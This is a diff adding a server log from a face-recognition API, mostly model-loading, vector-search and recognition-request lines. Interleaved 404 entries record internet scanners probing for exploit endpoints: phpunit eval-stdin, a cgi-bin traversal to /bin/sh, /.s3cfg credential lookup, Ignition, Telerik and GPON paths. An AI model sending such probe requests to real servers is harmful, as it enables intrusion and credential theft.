@@ -1,0 +1,1690 @@
+2022-11-14 11:41:22.881 | DEBUG    | module.milvus_helpers:__init__:18 -  Successfully connect to MiLvus with IP: 0.0.0.0 and Port: 19530
+INFO:     Started server process [1892343]
+INFO:     Waiting for application startup.
+INFO:     Application startup complete.
+INFO:     Uvicorn running on http://0.0.0.0:8080 (Press CTRL+C to quit)
+INFO:     8.214.87.1:45988 - "GET / HTTP/1.1" 404 Not Found
+INFO:     8.214.87.1:47430 - "GET / HTTP/1.1" 404 Not Found
+INFO:     185.224.128.201:32768 - "GET /admin/assets/js/views/login.js HTTP/1.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     178.213.105.174:57823 - "GET / HTTP/1.1" 404 Not Found
+INFO:     178.213.105.174:57872 - "GET /ncsi.txt HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     120.85.94.63:16466 - "POST /GponForm/diag_Form?images/ HTTP/1.1" 404 Not Found
+INFO:     45.142.192.5:59346 - "GET / HTTP/1.1" 404 Not Found
+INFO:     92.118.39.78:41140 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Unsupported upgrade request.
+/home/ai-r-d/anaconda3/envs/client/lib/python3.10/site-packages/onnxruntime/capi/onnxruntime_inference_collection.py:54: UserWarning: Specified provider 'CUDAExecutionProvider' is not in available provider names.Available providers: 'CPUExecutionProvider'
+  warnings.warn(
+/media/ai-r-d/DATA1/Face_triton/service/face_service_H.py:329: DeprecationWarning: `np.int` is a deprecated alias for the builtin `int`. To silence this warning, use `int` by itself. Doing this will not modify any behavior and is safe. When replacing `np.int`, you may wish to use e.g. `np.int64` or `np.int32` to specify the precision. If you wish to review your current use, check the release note link for additional information.
+Deprecated in NumPy 1.20; for more details and guidance: https://numpy.org/devdocs/release/1.20.0-notes.html#deprecations
+  x1,y1,x2,y2,score = bbox.astype(np.int)
+2022-11-14 17:32:22.777 | DEBUG    | module.milvus_helpers:search_vectors:163 - Successfully search in collection: ["['(distance: 259.6915283203125, id: 437359909826986442)']"]
+2022-11-14 17:32:22.777 | DEBUG    | module.mysql_helpers:search_by_milvus_ids:118 - MYSQL search by milvus id.
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+box [[189.39365   286.76016   473.95728   603.7977      0.8475484]]
+('62fc7533422ac27d7b650971', 'static/6fae596e615b11ed84aaad0224ec19ed_62fc7533422ac27d7b650971.jpg')
+path:  ['static/6fae596e615b11ed84aaad0224ec19ed_62fc7533422ac27d7b650971.jpg']
+pr>>>>>>>>>>> ['437359909826986442']
+time:  0.1778101921081543
+INFO:     123.24.206.26:49581 - "POST /recognize HTTP/1.1" 200 OK
+INFO:     154.89.5.119:39602 - "GET / HTTP/1.0" 404 Not Found
+2022-11-14 17:41:57.400 | DEBUG    | module.milvus_helpers:search_vectors:163 - Successfully search in collection: ["['(distance: 326.8953857421875, id: 437359909826986575)']"]
+2022-11-14 17:41:57.400 | DEBUG    | module.mysql_helpers:search_by_milvus_ids:118 - MYSQL search by milvus id.
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+box [[154.77339   183.94412   488.43787   513.4225      0.8306252]]
+('62846811f6f4201104b3af89', 'static/7a9d193c622811edaede09a65ce7aeeb_62846811f6f4201104b3af89_masked.jpg')
+path:  ['static/7a9d193c622811edaede09a65ce7aeeb_62846811f6f4201104b3af89_masked.jpg']
+pr>>>>>>>>>>> ['437359909826986575']
+time:  0.21664953231811523
+INFO:     123.24.206.26:36773 - "POST /recognize HTTP/1.1" 200 OK
+2022-11-14 17:42:26.740 | DEBUG    | module.milvus_helpers:search_vectors:163 - Successfully search in collection: ["['(distance: 422.130859375, id: 437359909826986568)']"]
+2022-11-14 17:42:26.740 | DEBUG    | module.mysql_helpers:search_by_milvus_ids:118 - MYSQL search by milvus id.
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+box [[140.04109   139.43762   485.24008   502.70285     0.7793139]]
+('62846811f6f4201104b3af89', 'static/7a9d193c622811edaede09a65ce7aeeb_62846811f6f4201104b3af89.jpg')
+path:  ['static/7a9d193c622811edaede09a65ce7aeeb_62846811f6f4201104b3af89.jpg']
+pr>>>>>>>>>>> ['437359909826986568']
+time:  0.23041105270385742
+INFO:     123.24.206.26:60575 - "POST /recognize HTTP/1.1" 200 OK
+2022-11-14 17:42:37.584 | DEBUG    | module.milvus_helpers:search_vectors:163 - Successfully search in collection: ["['(distance: 322.58917236328125, id: 437359909826986568)']"]
+2022-11-14 17:42:37.584 | DEBUG    | module.mysql_helpers:search_by_milvus_ids:118 - MYSQL search by milvus id.
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+box [[145.18654    192.81583    481.5855     545.1713       0.77688146]]
+('62846811f6f4201104b3af89', 'static/7a9d193c622811edaede09a65ce7aeeb_62846811f6f4201104b3af89.jpg')
+path:  ['static/7a9d193c622811edaede09a65ce7aeeb_62846811f6f4201104b3af89.jpg']
+pr>>>>>>>>>>> ['437359909826986568']
+time:  0.18861103057861328
+INFO:     123.24.206.26:61497 - "POST /recognize HTTP/1.1" 200 OK
+2022-11-14 17:53:31.432 | ERROR    | __main__:search:324 - Not face
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+box []
+INFO:     123.24.206.26:59399 - "POST /recognize HTTP/1.1" 200 OK
+2022-11-14 17:53:45.972 | ERROR    | __main__:search:324 - Not face
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+box []
+INFO:     123.24.206.26:55570 - "POST /recognize HTTP/1.1" 200 OK
+2022-11-14 17:53:51.425 | ERROR    | __main__:search:324 - Not face
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+box []
+INFO:     123.24.206.26:39909 - "POST /recognize HTTP/1.1" 200 OK
+2022-11-14 17:53:57.656 | DEBUG    | module.milvus_helpers:search_vectors:163 - Successfully search in collection: ["['(distance: 237.82489013671875, id: 437359909826986407)']"]
+2022-11-14 17:53:57.657 | DEBUG    | module.mysql_helpers:search_by_milvus_ids:118 - MYSQL search by milvus id.
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+box [[163.35524    106.65422    530.56433    413.6599       0.71328807]]
+('6284680ef6f4201104b3af75', 'static/40bf898c609a11ed84aaad0224ec19ed_6284680ef6f4201104b3af75_masked.jpg')
+path:  ['static/40bf898c609a11ed84aaad0224ec19ed_6284680ef6f4201104b3af75_masked.jpg']
+pr>>>>>>>>>>> ['437359909826986407']
+time:  0.1606283187866211
+INFO:     123.24.206.26:40292 - "POST /recognize HTTP/1.1" 200 OK
+INFO:     109.248.6.45:51985 - "GET / HTTP/1.0" 404 Not Found
+2022-11-14 17:57:04.232 | ERROR    | __main__:search:324 - Not face
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+box []
+INFO:     123.24.206.26:59180 - "POST /recognize HTTP/1.1" 200 OK
+2022-11-14 17:57:09.066 | DEBUG    | module.milvus_helpers:search_vectors:163 - Successfully search in collection: ["['(distance: 215.45925903320312, id: 437359909826986008)']"]
+2022-11-14 17:57:09.067 | DEBUG    | module.mysql_helpers:search_by_milvus_ids:118 - MYSQL search by milvus id.
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+box [[128.65668    160.2919     458.9589     405.71252      0.65212107]]
+('62fc7496422ac27d7b64d8bc', 'static/4d6e9b4a5e8e11ed8a8bb108c0801c44_62fc7496422ac27d7b64d8bc.jpg')
+path:  ['static/4d6e9b4a5e8e11ed8a8bb108c0801c44_62fc7496422ac27d7b64d8bc.jpg']
+pr>>>>>>>>>>> ['437359909826986008']
+time:  0.16911602020263672
+INFO:     123.24.206.26:55673 - "POST /recognize HTTP/1.1" 200 OK
+2022-11-14 18:22:57.721 | DEBUG    | module.mysql_helpers:show_image:92 - Mysql search by image: ['630053a08e6de33f58228691']
+INFO:     123.24.206.26:62450 - "POST /showimage HTTP/1.1" 200 OK
+INFO:     123.24.206.26:53080 - "GET /4d55a5045ea711ed8a8bb108c0801c44_630053a08e6de33f58228691.jpg HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     45.89.55.10:62459 - "GET / HTTP/1.1" 404 Not Found
+INFO:     45.89.55.10:62459 - "GET / HTTP/1.1" 404 Not Found
+INFO:     78.108.177.52:37974 - "GET / HTTP/1.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     45.142.192.5:48416 - "GET / HTTP/1.1" 404 Not Found
+INFO:     45.142.192.7:54954 - "GET / HTTP/1.1" 404 Not Found
+INFO:     41.42.111.50:51566 - "GET / HTTP/1.1" 404 Not Found
+2022-11-14 22:09:28.124 | DEBUG    | module.mysql_helpers:show_image:92 - Mysql search by image: ['61c6c1888d4c8e02a8d83947']
+INFO:     123.24.206.26:37574 - "POST /showimage HTTP/1.1" 200 OK
+INFO:     71.6.232.25:39938 - "GET / HTTP/1.1" 404 Not Found
+INFO:     157.245.77.116:40182 - "GET / HTTP/1.1" 404 Not Found
+INFO:     45.142.192.8:53148 - "GET / HTTP/1.1" 404 Not Found
+INFO:     60.217.75.70:43038 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     46.174.191.32:38364 - "GET / HTTP/1.0" 404 Not Found
+INFO:     45.142.192.5:56956 - "GET / HTTP/1.1" 404 Not Found
+INFO:     36.91.64.21:51635 - "GET / HTTP/1.1" 404 Not Found
+INFO:     205.210.31.55:56538 - "GET / HTTP/1.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     179.43.177.154:55192 - "GET /.s3cfg HTTP/1.1" 404 Not Found
+INFO:     152.89.196.211:57458 - "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 Not Found
+INFO:     152.89.196.211:33200 - "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 404 Not Found
+INFO:     152.89.196.211:45662 - "GET /_ignition/execute-solution HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     152.89.196.211:59464 - "GET / HTTP/1.1" 404 Not Found
+INFO:     152.89.196.211:37428 - "POST /cgi-bin/../../../../bin/sh HTTP/1.1" 404 Not Found
+INFO:     152.89.196.211:40862 - "GET /actuator/gateway/routes HTTP/1.1" 404 Not Found
+INFO:     92.118.39.78:47412 - "GET / HTTP/1.1" 404 Not Found
+INFO:     128.14.134.134:33340 - "GET /Telerik.Web.UI.WebResource.axd?type=rau HTTP/1.1" 404 Not Found
+INFO:     45.142.192.9:42974 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Unsupported upgrade request.
+INFO:     167.94.138.62:46864 - "GET / HTTP/1.1" 404 Not Found
+INFO:     167.94.138.62:44328 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     45.142.192.5:60670 - "GET / HTTP/1.1" 404 Not Found
+INFO:     106.75.230.132:46930 - "GET / HTTP/1.0" 404 Not Found
+INFO:     45.142.192.6:38104 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     45.142.192.7:48582 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     123.24.206.26:41498 - "GET / HTTP/1.1" 404 Not Found
+INFO:     123.24.206.26:38140 - "GET / HTTP/1.1" 404 Not Found
+INFO:     192.241.196.158:36082 - "GET / HTTP/1.1" 404 Not Found
+INFO:     192.241.198.196:49158 - "GET / HTTP/1.1" 404 Not Found
+INFO:     123.24.206.26:64977 - "GET / HTTP/1.1" 404 Not Found
+INFO:     123.24.206.26:51987 - "GET / HTTP/1.1" 404 Not Found
+INFO:     134.209.40.181:58944 - "GET / HTTP/1.1" 404 Not Found
+2022-11-15 07:48:21.534 | DEBUG    | module.milvus_helpers:search_vectors:163 - Successfully search in collection: ["['(distance: 283.5087890625, id: 437359909826986099)']"]
+2022-11-15 07:48:21.536 | DEBUG    | module.mysql_helpers:search_by_milvus_ids:118 - MYSQL search by milvus id.
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+box [[127.55844     76.469635   450.72552    336.71252      0.69672835]]
+('63049c4467148c4f842702e1', 'static/1dab7b225f0011ed8a8bb108c0801c44_63049c4467148c4f842702e1_masked.jpg')
+path:  ['static/1dab7b225f0011ed8a8bb108c0801c44_63049c4467148c4f842702e1_masked.jpg']
+pr>>>>>>>>>>> ['437359909826986099']
+time:  0.3663480281829834
+INFO:     123.24.206.26:51739 - "POST /recognize HTTP/1.1" 200 OK
+2022-11-15 07:48:40.364 | DEBUG    | module.milvus_helpers:search_vectors:163 - Successfully search in collection: ["['(distance: 562.9725952148438, id: 437359909826986288)']"]
+2022-11-15 07:48:40.365 | DEBUG    | module.mysql_helpers:search_by_milvus_ids:118 - MYSQL search by milvus id.
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+box [[115.75513    170.13023    467.06708    471.27203      0.64585745]]
+('6332af439cc75161026cb5d6', 'static/71a6dbe25fcb11ed8a8bb108c0801c44_6332af439cc75161026cb5d6.jpg')
+path:  ['static/71a6dbe25fcb11ed8a8bb108c0801c44_6332af439cc75161026cb5d6.jpg']
+pr>>>>>>>>>>> ['437359909826986288']
+time:  0.32648491859436035
+INFO:     123.24.206.26:46039 - "POST /recognize HTTP/1.1" 200 OK
+2022-11-15 07:48:59.221 | DEBUG    | module.milvus_helpers:search_vectors:163 - Successfully search in collection: ["['(distance: 301.57989501953125, id: 437359909826986218)']"]
+2022-11-15 07:48:59.222 | DEBUG    | module.mysql_helpers:search_by_milvus_ids:118 - MYSQL search by milvus id.
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+box [[185.44928   171.99374   444.63583   379.50787     0.8130054]]
+('633554ad713bea0e8df560fc', 'static/735386085fca11ed8a8bb108c0801c44_633554ad713bea0e8df560fc.jpg')
+path:  ['static/735386085fca11ed8a8bb108c0801c44_633554ad713bea0e8df560fc.jpg']
+pr>>>>>>>>>>> ['437359909826986218']
+time:  0.33057713508605957
+INFO:     123.24.206.26:41562 - "POST /recognize HTTP/1.1" 200 OK
+2022-11-15 07:49:03.908 | DEBUG    | module.milvus_helpers:search_vectors:163 - Successfully search in collection: ["['(distance: 413.5607604980469, id: 437359909826986295)']"]
+2022-11-15 07:49:03.909 | DEBUG    | module.mysql_helpers:search_by_milvus_ids:118 - MYSQL search by milvus id.
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+box [[287.97165    193.46526    504.0873     359.26385      0.63369477]]
+('6332af439cc75161026cb5d6', 'static/71a6dbe25fcb11ed8a8bb108c0801c44_6332af439cc75161026cb5d6_masked.jpg')
+path:  ['static/71a6dbe25fcb11ed8a8bb108c0801c44_6332af439cc75161026cb5d6_masked.jpg']
+pr>>>>>>>>>>> ['437359909826986295']
+time:  0.3377838134765625
+INFO:     123.24.206.26:37186 - "POST /recognize HTTP/1.1" 200 OK
+2022-11-15 07:49:07.689 | DEBUG    | module.milvus_helpers:search_vectors:163 - Successfully search in collection: ["['(distance: 553.1005249023438, id: 437359909826986295)']"]
+2022-11-15 07:49:07.690 | DEBUG    | module.mysql_helpers:search_by_milvus_ids:118 - MYSQL search by milvus id.
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+box [[142.45016   201.61589   359.0458    358.92328     0.6576385]]
+('6332af439cc75161026cb5d6', 'static/71a6dbe25fcb11ed8a8bb108c0801c44_6332af439cc75161026cb5d6_masked.jpg')
+path:  ['static/71a6dbe25fcb11ed8a8bb108c0801c44_6332af439cc75161026cb5d6_masked.jpg']
+pr>>>>>>>>>>> ['437359909826986295']
+time:  0.346010684967041
+INFO:     123.24.206.26:42420 - "POST /recognize HTTP/1.1" 200 OK
+2022-11-15 07:49:11.898 | ERROR    | __main__:search:324 - Not face
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+box []
+INFO:     123.24.206.26:35286 - "POST /recognize HTTP/1.1" 200 OK
+2022-11-15 07:49:27.311 | ERROR    | __main__:search:324 - Not face
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+box []
+INFO:     123.24.206.26:36560 - "POST /recognize HTTP/1.1" 200 OK
+2022-11-15 07:49:41.387 | DEBUG    | module.milvus_helpers:search_vectors:163 - Successfully search in collection: ["['(distance: 386.6362609863281, id: 437359909826986008)']"]
+2022-11-15 07:49:41.388 | DEBUG    | module.mysql_helpers:search_by_milvus_ids:118 - MYSQL search by milvus id.
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+box [[177.61403   143.436     458.43106   361.5164      0.6763461]]
+('62fc7496422ac27d7b64d8bc', 'static/4d6e9b4a5e8e11ed8a8bb108c0801c44_62fc7496422ac27d7b64d8bc.jpg')
+path:  ['static/4d6e9b4a5e8e11ed8a8bb108c0801c44_62fc7496422ac27d7b64d8bc.jpg']
+pr>>>>>>>>>>> ['437359909826986008']
+time:  0.3248884677886963
+INFO:     123.24.206.26:63898 - "POST /recognize HTTP/1.1" 200 OK
+2022-11-15 07:56:15.439 | DEBUG    | module.milvus_helpers:search_vectors:163 - Successfully search in collection: ["['(distance: 178.365966796875, id: 437359909826986442)']"]
+2022-11-15 07:56:15.440 | DEBUG    | module.mysql_helpers:search_by_milvus_ids:118 - MYSQL search by milvus id.
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+box [[178.41528    221.24133    465.96915    527.4243       0.82053083]]
+('62fc7533422ac27d7b650971', 'static/6fae596e615b11ed84aaad0224ec19ed_62fc7533422ac27d7b650971.jpg')
+path:  ['static/6fae596e615b11ed84aaad0224ec19ed_62fc7533422ac27d7b650971.jpg']
+pr>>>>>>>>>>> ['437359909826986442']
+time:  0.17164349555969238
+INFO:     123.24.206.26:65188 - "POST /recognize HTTP/1.1" 200 OK
+2022-11-15 07:56:43.373 | ERROR    | module.mysql_helpers:show_image:95 - Mysql error: tuple index out of range with sql: select image_path from _2090App where person_id = %s ;
+INFO:     123.24.206.26:46354 - "POST /showimage HTTP/1.1" 200 OK
+2022-11-15 07:56:47.514 | DEBUG    | module.milvus_helpers:search_vectors:163 - Successfully search in collection: ["['(distance: 175.4135284423828, id: 437359909826986078)']"]
+2022-11-15 07:56:47.514 | DEBUG    | module.mysql_helpers:search_by_milvus_ids:118 - MYSQL search by milvus id.
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+box [[202.74164   178.46924   428.47662   421.02908     0.8750446]]
+('634e69d5bbddf814f940645f', 'static/b95a8e065eff11ed8a8bb108c0801c44_634e69d5bbddf814f940645f.jpg')
+path:  ['static/b95a8e065eff11ed8a8bb108c0801c44_634e69d5bbddf814f940645f.jpg']
+pr>>>>>>>>>>> ['437359909826986078']
+time:  0.22829914093017578
+INFO:     123.24.206.26:38740 - "POST /recognize HTTP/1.1" 200 OK
+2022-11-15 07:57:08.759 | ERROR    | __main__:search:301 - Can't rotate image face
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+INFO:     123.24.206.26:44117 - "POST /recognize HTTP/1.1" 200 OK
+2022-11-15 07:57:23.652 | DEBUG    | module.milvus_helpers:search_vectors:163 - Successfully search in collection: ["['(distance: 421.0579528808594, id: 437359909826986540)']"]
+2022-11-15 07:57:23.653 | DEBUG    | module.mysql_helpers:search_by_milvus_ids:118 - MYSQL search by milvus id.
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+box [[228.5306    173.44408   492.85858   458.63724     0.8064445]]
+('6284680ff6f4201104b3af79', 'static/071e2c64622611edaede09a65ce7aeeb_6284680ff6f4201104b3af79.jpg')
+path:  ['static/071e2c64622611edaede09a65ce7aeeb_6284680ff6f4201104b3af79.jpg']
+pr>>>>>>>>>>> ['437359909826986540']
+time:  0.21246862411499023
+INFO:     123.24.206.26:60409 - "POST /recognize HTTP/1.1" 200 OK
+2022-11-15 07:57:34.473 | DEBUG    | module.milvus_helpers:search_vectors:163 - Successfully search in collection: ["['(distance: 412.87908935546875, id: 437359909826986134)']"]
+2022-11-15 07:57:34.473 | DEBUG    | module.mysql_helpers:search_by_milvus_ids:118 - MYSQL search by milvus id.
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+box [[216.67966   191.31534   469.4989    453.10284     0.8261814]]
+('626a1ca115e49f66d33d5c8f', 'static/b9eb032a5f0211ed8a8bb108c0801c44_626a1ca115e49f66d33d5c8f.jpg')
+path:  ['static/b9eb032a5f0211ed8a8bb108c0801c44_626a1ca115e49f66d33d5c8f.jpg']
+pr>>>>>>>>>>> ['437359909826986134']
+time:  0.21961236000061035
+INFO:     123.24.206.26:63132 - "POST /recognize HTTP/1.1" 200 OK
+2022-11-15 08:00:14.306 | ERROR    | __main__:search:324 - Not face
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
